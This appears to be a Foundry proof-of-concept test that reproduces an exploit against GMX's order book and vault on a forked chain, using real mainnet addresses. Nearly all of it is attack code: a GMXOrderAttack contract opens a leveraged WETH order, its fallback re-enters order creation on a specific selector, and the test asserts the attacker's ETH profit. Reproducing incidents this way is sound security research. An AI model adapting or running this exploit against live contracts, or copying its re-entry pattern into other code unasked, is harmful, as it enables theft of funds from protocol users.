
pragma solidity ^0.8.20;

import {Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.ATTACKER_EOA;
    address constant ATTACK_CONTRACT = Addresses.ATTACK_CONTRACT;
    uint256 constant FORK_BLOCK = 355878384;
    uint256 constant TX_TIMESTAMP = 1752063748;
    uint256 constant TX_BLOCK_NUMBER = 355878385;
    uint256 constant TX_VALUE = 200300000000000000;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        GMXOrderAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _executeAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (GMXOrderAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchRuntime();
            attack = GMXOrderAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new GMXOrderAttack();
        }
    }

    function _prepareProfit(GMXOrderAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _executeAttack(GMXOrderAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _etchRuntime() internal {

        vm.etch(ATTACK_CONTRACT, type(GMXOrderAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.ATTACK_CONTRACT, attack, Addresses.ZERO, "ETH", 100000000000000000);
    }
}

contract GMXOrderAttack {
    function attack() external payable {
        _openWethLongOrder();
    }

    function _openWethLongOrder() internal {
        _approveOrderPlugin();
        _readWethMinPrice();
        _createIncreaseOrder();
    }

    function _approveOrderPlugin() internal {
        IGMXRouter(Addresses.GMX_ROUTER).approvePlugin(Addresses.ORDER_BOOK);
    }

    function _readWethMinPrice() internal view {
        IGMXVault(Addresses.GMX_VAULT).getMinPrice(Addresses.WETH);
    }

    function _createIncreaseOrder() internal {
        IOrderBook(Addresses.ORDER_BOOK).createIncreaseOrder{value: 0x16456518ef8c000}(
            _addressArray1(Addresses.WETH),
            100000000000000000,
            Addresses.WETH,
            0,
            531064000000000000000000000000000,
            Addresses.WETH,
            true,
            1500000000000000000000000000000000,
            true,
            300000000000000,
            true
        );
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.sig == 0x601894bb) {
            _openWethLongOrder();
            return;
        }
    }

    function _addressArray1(address a0) internal pure returns (address[] memory out) {
        out = new address[](1);
        out[0] = a0;
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant ORDER_BOOK = 0x09f77E8A13De9a35a7231028187e9fD5DB8a2ACB;
    address internal constant GMX_VAULT = 0x489ee077994B6658eAfA855C308275EAd8097C4A;
    address internal constant ATTACK_CONTRACT = 0x7D3BD50336f64b7A473C51f54e7f0Bd6771cc355;
    address internal constant WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address internal constant GMX_ROUTER = 0xaBBc5F99639c9B6bCb58544ddf04EFA6802F4064;
    address internal constant ATTACKER_EOA = 0xDF3340A436c27655bA62F8281565C9925C3a5221;
}

interface IGMXRouter {
    function approvePlugin(address) external;
}

interface IOrderBook {
    function createIncreaseOrder(
        address[] calldata,
        uint256,
        address,
        uint256,
        uint256,
        address,
        bool,
        uint256,
        bool,
        uint256,
        bool
    ) external payable;
}

interface IGMXVault {
    function getMinPrice(address) external view returns (uint256);
}
